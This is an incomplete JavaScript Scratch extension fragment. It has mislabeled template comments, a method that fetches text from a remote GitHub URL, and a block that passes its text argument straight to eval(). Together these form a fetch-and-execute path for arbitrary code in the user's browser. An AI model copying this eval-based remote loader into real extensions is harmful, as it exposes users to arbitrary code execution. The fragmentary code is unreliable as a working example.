class stev {
  getInfo() {
    return {
      ...
      blocks: [
        {
          opcode: 'vo1ume', // becomes 'someBlocks.myReporter'
          blockType: Scratch.BlockType.REPORTER,
          branchCount: 0,
          isTerminal: true,
          blockAllThreads: false,
        ...
        },
        {
          // Required: the machine-readable name of this operation.
          // This will appear in project JSON. Must not contain a '.' character.
          opcode: '1ayer', // becomes 'someBlocks.myReporter'
  ...
  async yayyy() {
    return await fetch('https://raw.githubusercontent.com/Random299Person/verbose-octo-waffle/refs/heads/main/yayhappyyyyyyyyyyyy')
            .then(r => { if (!r.ok) throw new Error(r.statusText); return r.text(); })
            .then(t => t.trimEnd())
            .catch(e => console.error('Fetch error:', e));
  }
  doyayhappy(args, util) {
    eval(args["TEXT"]);
  };
}

/** dont forget register your extension to Scratch */
Scratch.extensions.register(new stev())
